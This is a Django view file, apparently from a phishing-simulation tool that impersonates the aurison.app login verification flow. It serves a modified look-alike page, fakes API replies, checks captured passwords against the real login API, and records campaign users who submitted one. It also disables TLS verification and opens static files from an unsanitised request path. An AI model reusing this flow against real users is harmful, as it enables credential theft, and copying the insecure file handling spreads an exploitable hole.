from django.http import HttpRequest, HttpResponseRedirect, FileResponse, JsonResponse
from django.shortcuts import redirect
from django.views import View


from .utils import buildHttpRespone, isPhishingToken, checkLogin
from management.models import AurisonUser
from mails.models import Token


from decouple import config
from requests import post
from json import loads



#Note (to future self): Refactor and clean this view. Looks messy :(
class Proxy(View):
    def __init__(self, *args, **kwargs):
        self.URL = config('PROD_API') if config('LIVE', cast=bool) else config('STAGING_API')

        super().__init__(*args, **kwargs)
    

    def get(self, request, *args, **kwargs):
        #This handles situations where the path doesn't begin with '/' and react is trying to fetch a static file
        if '/static' in request.path:
            path = request.path.split('/static')[1] #Grab everything after 
            return FileResponse(open(f'Proxy/static/{path}','rb'))
        
        
        if '/verify' in request.path:
            response = self.handleVerifyRoute(request)
            if response:         #HttpResponse of some kind.
                return response


        #Server the html file so react can load static files and do it's thing.
        return FileResponse(open('Proxy/templates/index.html', 'rb'))





    def post(self, request, *args, **kwargs):
        #Likely an Api request. So just rebuild the entire request to aurison.
        PATH = request.path
        URL = self.URL + request.path
        
        if PATH == '/verify':
            response = self.handleVerifyRoute(request)
            if response:         
                return response
      
    
        headers = dict(request.headers)
        del headers["Host"]     #Doesn't really matter. Probably turn this into a middleware later.

        response = post(
            url = URL,
            headers = headers,
            data = request.body,
            verify = False
        )

        return buildHttpRespone(response)    





    def handleVerifyRoute(self, request: HttpRequest) -> (FileResponse | JsonResponse | HttpResponseRedirect):
        #The verify route is esentially where the phishing occurs.
        method = request.method.lower()
        email = ''
        token = ''
        
        if method == 'get':
            #request.path should look like "/verify/test@test.com/dndnsskdmsd"
            #Ideally, I should use url converters for this, but mangaing urls just got kinda wonky from there.
            #So I opted to just do this instead. Note (To future self): You should probably fix this :(
            email = request.path.split('/')[2]
            token = request.path.split('/')[3]

        else:
            body = loads(request.body) if request.content_type.lower() == 'application/json' else None
            email = body['email'] if body else ''   #Should always be a valid body but...
            token = body['token'] if body else ''
        

        phish = isPhishingToken(token)       #Check if its a token generated by us.

        if not phish:  
            return False    #This way, whatever method called this can run its remaing code block.
            
        
        #If the request made it here, it's for us and we need to respond appropraitely :)
        pToken = Token.objects.get(tokenID = token)

        if method == 'get':
            if not pToken.campaign.active:          #no point attempting a phish.
                return redirect('https://aurison.app')
            
            return FileResponse(open('Proxy/templates/index1337.html', 'rb'))   #Server the html that loads our modded js


        else: 
            #At this point it has to be a POST request. Except there's a future change.
            if body['action'] == 'info':
                payload = {                 
                    'error' : False,
                    'data' : {
                        'title' : "",
                        'forenames': "",
                        'surname' : "",
                        'organisation' : ""
                    }
                }

                response =  JsonResponse(payload)       #Fake a valid response to trick react.
                del response['server']                  #Note (to future self): Turn this into a middleware.

                return response
            

            #body['action'] has to be 'validate' if the request makes it here.
            #The phish is almost complete. We need to verify if the password is correct :D
            email = body['email']
            password = body['old']

            valid = checkLogin(email, password, self.URL)

            if valid['valid']:  #phish successful :)
                user = AurisonUser.objects.get(email = pToken.email, campaign = pToken.campaign)
                user.submittedPass = True
                user.save()

                return JsonResponse({'error': False, 'success': True})
            

            return valid['response']    #Password isn't correct.
